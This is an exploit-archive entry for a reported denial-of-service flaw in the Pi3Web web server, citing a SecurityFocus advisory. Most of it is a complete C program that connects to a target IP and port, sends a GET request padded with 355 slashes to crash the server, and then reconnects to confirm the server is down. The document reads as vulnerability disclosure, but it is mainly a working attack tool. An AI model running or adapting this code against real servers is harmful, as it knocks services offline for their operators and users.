source: http://www.securityfocus.com/bid/7555/info

It has been reported that Pi3Web server is prone to a denial of service vulnerability. Reportedly, when a malicious GET request is sent to the Pi3Web server the server will fail. It should be noted that the Unix version has been reported vulnerable, it is not currently known if other platforms are affected.

/*
 * Unix Version of the Pi3web DoS.
 * ----------------------------------------------------------
 * Info: Pi3Web Server is vulnerable to a denial of Service.
 * ----------------------------------------------------------
 * VULNERABILITY:
 * GET //// <- 354
 *
 * The bug was found by aT4r@3wdesign.es 04/26/2003
 * www.3wdesign.es Security
 * ----------------------------------------------------------
 * Unix Version Credits.
 * AUTHOR : Angelo Rosiello
 * CONTACT: angelo@rosiello.org, angelo@dtors.net
 *
*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <string.h>
#include <assert.h>

void addr_initialize();

int main(int argc, char **argv)
{
  int i, port, sd, rc;
  char buffer[355];
  char *get = "GET";
  char packet[360];
  struct sockaddr_in server;

  if(argc > 3 || argc < 2)
  {
    printf("USAGE: %s IP PORT\n", argv[0]);
    printf("e.g. ./pi3web-DoS 127.0.0.1 80\n");
    exit(0);
  }
  if(argc == 2) port = 80;
  else port = atoi(argv[2]);

  for(i = 0; i < 355; i++) buffer[i] = '/'; //Build the malformed request
  sprintf(packet, "%s %s\n", get, buffer);
  addr_initialize(&server, port, (long)inet_addr(argv[1]));

  sd = socket(AF_INET, SOCK_STREAM, 0);
  if(sd < 0) perror("Socket");
  assert(sd >= 0);
  rc = connect(sd, (struct sockaddr *) &server, sizeof(server));
  if(rc != 0) perror("Connect");
  assert(rc == 0);
  printf("\n\t\t(c) 2003 DTORS Security\n");
  printf("\t\tUnix Version DoS for Pi3web\n");
  printf("\t\tby Angelo Rosiello\n\n");
  write(sd, packet, strlen(packet)); //Caput!
  printf("Malformed packet sent!\n");
  close(sd);

  printf("Checking if the server crashed...\n");
  sleep(3);

  sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd < 0) perror("Socket");
  assert(sd >= 0);
  rc = connect(sd, (struct sockaddr *) &server, sizeof(server));
  if(rc != 0)
  {
    printf("The server is dead!\n");
    exit(0);
  }
  else if(rc == 0) printf("The server is not vulnerable!\n");
  close(sd);
  exit(0);
}

void addr_initialize (struct sockaddr_in *address, int port, long IPaddr)
{
        address -> sin_family = AF_INET;
        address -> sin_port = htons((u_short)port);
        address -> sin_addr.s_addr = IPaddr;
}

/*EOF*/

